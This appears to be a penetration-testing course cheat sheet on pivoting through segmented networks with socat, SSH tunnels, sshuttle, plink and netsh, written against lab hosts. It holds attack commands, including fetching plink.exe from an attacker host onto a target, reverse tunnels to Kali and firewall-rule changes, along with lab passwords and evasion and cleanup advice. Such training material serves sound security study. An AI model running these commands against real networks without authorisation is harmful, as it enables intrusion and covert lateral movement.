# Port Redirection and SSH Tunneling - Comprehensive Cheat Sheet

## Core Concepts

### Why Port Forwarding & Tunneling?
- **Flat Networks** (bad): All devices communicate freely - easy lateral movement for attackers
- **Segmented Networks** (good): Broken into subnets with restricted access between them
- **Network Controls**: Firewalls (software/hardware), Deep Packet Inspection (DPI)
- **Our Goal**: Traverse boundaries and bypass restrictions using port forwarding and tunneling

### Key Terminology
- **Port Redirection**: Redirecting packets from one socket to another
- **Tunneling**: Encapsulating one data stream within another (e.g., HTTP over SSH)
- **DMZ**: Buffer zone between untrusted (WAN) and internal networks
- **SOCKS Proxy**: Proxying protocol that forwards packets based on headers

---

## Linux Port Forwarding

### 1. Socat (Simple Port Forward)
**Use Case**: Forward single port when you can bind to the network interface
```bash
# Listen on port 2345, forward to 10.4.50.215:5432
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

# Would run on compromised machine
# Options:
# -ddd: verbose output
# fork: create new subprocess per connection (don't die after one)
# TCP-LISTEN:PORT: listening socket
# TCP:IP:PORT: destination socket
```

**Limitations**:
- One socket per forward
- Easy to detect
- Requires tool on target system

**Alternatives**:
- `rinetd`: Daemon for long-term forwards
- `iptables`: Requires root, enables IP forwarding
- `Netcat + FIFO`: Combine nc with named pipes

---

## SSH Tunneling (OpenSSH)

SSH server is running on our Kali machine.
```sudo systemctl start ssh```

In compromised machine make sure tty -
```python3 -c 'import pty; pty.spawn("/bin/sh")'```

### 2. SSH Local Port Forward (`-L`)
**Use Case**: Forward from SSH client through SSH server to destination
```bash
# Listen on 0.0.0.0:4455, forward to 172.16.50.217:445
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Format: -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
# -N: No shell (port forward only)
# -v: Verbose (for troubleshooting)
```

**Traffic Flow**:
```
Kali → SSH Client (listening) → SSH Tunnel → SSH Server → Destination
```

**Key Points**:
- Listening port on SSH **client** side
- Forwarding done by SSH **server**
- One socket per connection

---

### 3. SSH Dynamic Port Forward (`-D`)
**Use Case**: Forward multiple destinations through single SOCKS proxy
```bash
# Create SOCKS proxy on 0.0.0.0:9999
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# Only needs: -D [IP:]PORT
```

**Using with Proxychains**:
```bash
# Edit /etc/proxychains4.conf
socks5 192.168.50.63 9999

# Use with any tool
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
proxychains nmap -sT --top-ports=20 -Pn -n 172.16.50.217
```

**Key Points**:
- SOCKS5 supports: auth, IPv6, UDP/DNS
- SOCKS4: No auth, IPv4 only
- Requires SOCKS-compatible client or Proxychains
- Adjust `tcp_read_time_out` in proxychains.conf for faster scanning

**Proxychains Notes**:
- Uses `LD_PRELOAD` to hook libc functions
- Won't work on statically-linked binaries
- Works on most dynamically-linked network tools

---

### 4. SSH Remote Port Forward (`-R`)
**Use Case**: Bypass inbound firewall restrictions by connecting back to attacker SSH server
```bash
# From compromised host, connect back to Kali
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Format: -R [REMOTE_IP:]REMOTE_PORT:DEST_IP:DEST_PORT
```

**Traffic Flow**:
```
Compromised Host (SSH client) → SSH Tunnel → Kali SSH Server (listening) → Forward to destination
```

**Key Points**:
- Listening port on SSH **server** (Kali)
- Forwarding done by SSH **client** (compromised host)
- Like a "reverse shell" for port forwarding
- Requires SSH server on Kali: `sudo systemctl start ssh`
- May need to enable `PasswordAuthentication yes` in `/etc/ssh/sshd_config`

---

### 5. SSH Remote Dynamic Port Forward (`-R` with single port)
**Use Case**: SOCKS proxy on attacker machine, initiated from compromised host
```bash
# From compromised host
ssh -N -R 9998 kali@192.168.118.4

# Only specify listening port - binds to loopback by default
```

**Requirements**:
- OpenSSH client ≥ 7.6 (server version doesn't matter)
- Use with Proxychains on Kali

**Key Points**:
- Most flexible remote option
- SOCKS proxy on **attacker** machine
- Forwarding from **compromised** host
- Best for enumeration across multiple targets

---

### 6. sshuttle (VPN-like)
**Use Case**: Turn SSH connection into transparent VPN
```bash
# Connect through port forward to SSH server
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

**Requirements**:
- Root on SSH **client** (Kali)
- Python3 on SSH **server**

**Key Points**:
- Routes traffic transparently (no need for Proxychains)
- Good for complex internal networks
- Not lightweight (requires root + Python3)

---

## Windows Port Forwarding

### 7. Windows OpenSSH Client (ssh.exe)
**Location**: `C:\Windows\System32\OpenSSH\ssh.exe`

**Available Since**:
- Bundled: Windows 10 v1803+ (April 2018)
- Feature-on-Demand: Windows 10 v1709+
```cmd
# Check version
ssh.exe -V

# Remote dynamic port forward
ssh -N -R 9998 kali@192.168.118.4
```

**Key Points**:
- Same syntax as Linux OpenSSH
- Supports remote dynamic forwarding (if ≥ v7.6)
- May be removed by admins
- Use with Proxychains on Kali side

---

### 8. Plink (PuTTY Command-Line)
**Use Case**: When OpenSSH unavailable on Windows

```cmd
# Plink in kali - /usr/share/windows-resources/binaries/plink.exe
# Download to target
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe

# Remote port forward (RDP example)
C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
```
WARNING:
This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.
```
**Auto-accept SSH key** (for non-interactive shells):
```cmd
cmd.exe /c echo y | plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
#### confirm that port has openen on kali using -
```
ss -ntplu

# Connect to target machine from kali using xfreerdp
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

**Key Points**:
- Lightweight, standalone executable
- Trusted by admins (less suspicious)
- **No remote dynamic forwarding**
- Credentials on command line (security risk)
- Good for shell-only access
- nc.exe in usr/share/windows-resources/binaries can use wget to download this to target machine for webshell to reverseshell

---

### 9. Netsh (Native Windows)
**Use Case**: Native port forwarding (requires admin)
```cmd
# Add port forward
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

# Verify
netsh interface portproxy show all
netstat -anp TCP | find "2222"

# Add firewall rule
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow

# Cleanup (IMPORTANT!)
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

**Key Points**:
- **Requires admin privileges**
- Built-in (no external tools)
- Leaves configuration artifacts
- Must manage firewall rules separately
- Remember to clean up!

---

## Quick Reference Table

| Method | Client Listen | Server Forward | Use Case | Limitations |
|--------|---------------|----------------|----------|-------------|
| **Socat** | ✓ | ✓ | Simple single-port | One socket, easy to detect |
| **SSH Local (-L)** | ✓ | ✓ | Direct access through SSH | One socket per tunnel |
| **SSH Dynamic (-D)** | ✓ | ✓ | Multiple targets via SOCKS | Needs SOCKS-compatible client |
| **SSH Remote (-R)** | Server | ✓ | Bypass inbound firewall | One socket per tunnel |
| **SSH Remote Dynamic** | Server | ✓ | SOCKS + bypass firewall | Requires OpenSSH ≥7.6 |
| **sshuttle** | Transparent | ✓ | VPN-like access | Needs root + Python3 |
| **ssh.exe (Win)** | Varies | Varies | Same as Linux SSH | May be removed |
| **Plink (Win)** | Varies | ✓ | No OpenSSH on Windows | No remote dynamic |
| **Netsh (Win)** | ✓ | ✓ | Native Windows | Needs admin, leaves traces |

---

## Detection & Evasion Notes

⚠️ **Simple port forwards are easily detected**:
- Unusual listening ports (e.g., 2222, 4455)
- Non-standard connections from service accounts
- Unexpected network traffic patterns

**Mitigation strategies**:
- Use ephemeral tools
- Chain techniques
- Leverage covert channels
- Clean up firewall rules and configs
- Use standard ports when possible

---

## Common Workflow Patterns

### Pattern 1: Compromise → Enumerate → Forward
```bash
# 1. Get shell on edge host
curl <exploit>

# 2. Enumerate networks
ip addr
ip route

# 3. Set up appropriate forward
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

### Pattern 2: Pivot Through Multiple Hops
```bash
# Kali → CONFLUENCE01 → PGDATABASE01 → HRSHARES

# On CONFLUENCE01:
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# From Kali:
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin
```

### Pattern 3: Outbound Pivot (Firewall Bypass)
```bash
# From compromised host:
ssh -N -R 9998 kali@<KALI_IP>

# From Kali:
proxychains nmap -sT --top-ports=20 -Pn -n <INTERNAL_TARGET>
```

---

## Troubleshooting Tips

1. **No TTY for SSH prompts**: Use Python pty
```bash
   python3 -c 'import pty; pty.spawn("/bin/sh")'
```

2. **SSH key cache prompt (Windows)**: Pipe 'y'
```cmd
   cmd.exe /c echo y | plink.exe ...
```

3. **Slow Proxychains scanning**: Edit `/etc/proxychains4.conf`
```
   tcp_read_time_out 1000
   tcp_connect_time_out 800
```

4. **Verify listening ports**:
```bash
   ss -ntplu                    # Linux
   netstat -anp TCP | find "X"  # Windows
```

5. **SSH debug output**: Add `-v` (or `-vv`, `-vvv`)

---

## Critical Reminders

✅ **Always clean up**:
- Kill port forward processes
- Remove firewall rules
- Delete temporary files
- Close SSH connections

✅ **UAC considerations**: Admin tools like Netsh may require UAC bypass

✅ **Credentials safety**: Avoid passwords on command line in hostile networks

✅ **Test connectivity**: Verify forwards work before pivoting further

---

## Lab Exercise Checklist

- [ ] Socat port forward to PostgreSQL
- [ ] SSH local forward to SMB share
- [ ] SSH dynamic forward + Proxychains scan
- [ ] SSH remote forward through firewall
- [ ] SSH remote dynamic forward
- [ ] sshuttle transparent access
- [ ] Windows ssh.exe remote dynamic
- [ ] Plink remote forward to RDP
- [ ] Netsh port forward with firewall rule

---

**End of Cheat Sheet** - Master these techniques to navigate complex segmented networks! 🎯
